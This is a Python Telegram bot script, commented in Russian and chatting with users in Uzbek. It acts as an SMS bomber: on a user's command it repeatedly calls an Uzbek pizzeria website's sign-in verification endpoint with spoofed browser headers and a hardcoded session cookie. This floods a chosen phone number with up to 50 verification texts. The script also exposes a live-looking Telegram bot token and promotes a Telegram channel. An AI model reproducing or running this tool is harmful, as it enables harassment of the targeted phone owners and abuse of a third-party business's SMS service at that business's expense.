import requests
import telebot
import threading
import time

token = "7106642461:AAGsQLa7-saDi7q6yF_W2MbKR9rs7VmE1pg"
bot = telebot.TeleBot(token)

url = 'https://thepizzeria.uz/ajax-user'

headers = {
        'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua-platform': '"Android"',
        'Origin': 'https://thepizzeria.uz',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://thepizzeria.uz/sign-in/',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,uz;q=0.6',
        'Cookie': '_ga=GA1.1.1256400888.1710473476; _fbp=fb.1.1710473478757.59954432; PHPSESSID=8ad7be65b3f405eed39894fe99a827c5; ls-visitor=8ad7be65b3f405eed39894fe99a827c5; activeCurrencyId=3; _ga_B07C64RCH6=GS1.1.1710473475.1.1.1710473534.0.0.0'
}

# Словарь для отслеживания состояния отправки SMS для каждого пользователя
sending_sms = {}

# Функция для отправки SMS
def send_sms(phone_number, sms_count, chat_id):
    data = {
        'action': 'authCheck',
        'user[phone]': f'+998 ({phone_number[:2]}) {phone_number[2:5]}-{phone_number[5:]}'
    }

    # Устанавливаем флаг отправки SMS для данного чата в True
    sending_sms[chat_id] = True

    total_sent_sms = 0
    sms_status_message = bot.send_message(chat_id, f"✅Yuborilgan SMS soni: {total_sent_sms}")

    for _ in range(sms_count):
        # Проверяем, не было ли отправки отменено пользователем
        if sending_sms.get(chat_id) == False:
            break

        if send_sms_request(data):
            total_sent_sms += 1
            bot.edit_message_text(f"♻️SMS yuborilmoqda... {total_sent_sms}\nSMS ni to'xtatish uchun /stop buyrug'ini bering.", chat_id=chat_id, message_id=sms_status_message.message_id)
            time.sleep(1)
        else:
            bot.send_message(chat_id, "❌Xatolik: SMS yuborilmadi.")
    
    # Устанавливаем флаг отправки SMS для данного чата обратно в False
    sending_sms[chat_id] = False
    bot.send_message(chat_id, f"📄Yuborilgan SMSlar soni: {total_sent_sms} ta✅\n\nBatafsil: <a href='t.me/+cCjXOEmdHv03Nzhh'>t.me/+cCjXOEmdHv03Nzhh</a>"'✅', parse_mode='HTML', disable_web_page_preview=True)

# Функция для выполнения запроса отправки SMS
def send_sms_request(data):
    response = requests.post(url, headers=headers, data=data)
    return response.ok

# Обработчик команды /start
@bot.message_handler(commands=["start"])
def start_message(message):
    bot.send_message(message.chat.id, "👋🏻Assalomu aleykum! Botdan foydalanish tartibi: nomer va sms soni (minimum 1, maksimum 50 ta sms) masalan: 901234567 10\n\nBatafsil: <a href='t.me/+cCjXOEmdHv03Nzhh'>t.me/+cCjXOEmdHv03Nzhh</a>"'✅', parse_mode='HTML', disable_web_page_preview=True)

# Обработчик сообщений
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "/stop":
        if sending_sms.get(message.chat.id) == True:
            # Отменяем отправку SMS, устанавливая флаг в False
            sending_sms[message.chat.id] = False
            bot.send_message(message.chat.id, "〽️SMS yuborish to'xtatildi.")
        else:
            bot.send_message(message.chat.id, "❌Sizda aktiv SMS yuborishlar yoq.")
    else:
        data = message.text.split()
        if len(data) == 2 and data[0].isdigit() and len(data[0]) <= 9 and data[1].isdigit():
            phone_number = data[0]
            sms_count = int(data[1])
            if 1 <= sms_count <= 50:
                # Проверяем, не идет ли уже отправка SMS для данного чата
                if sending_sms.get(message.chat.id) == True:
                    bot.send_message(message.chat.id, "❌SMS yuborish allaqachon boshlangan, Iltimos kuting yoki /stop buyrig'i orqali to'xtating")
                else:
                    # Запускаем поток для отправки SMS
                    threading.Thread(target=send_sms, args=(phone_number, sms_count, message.chat.id)).start()
            else:
                bot.send_message(message.chat.id, "⚠️Noto'g'ri format. Botdan foydalanish tartibi: nomer va sms soni (minimum 1, maksimum 50 ta sms) masalan: 901234567 10")
        else:
            bot.send_message(message.chat.id, "⚠️Noto'g'ri format. Botdan foydalanish tartibi: nomer va sms soni (minimum 1, maksimum 50 ta sms) masalan: 901234567 10")
bot.polling()
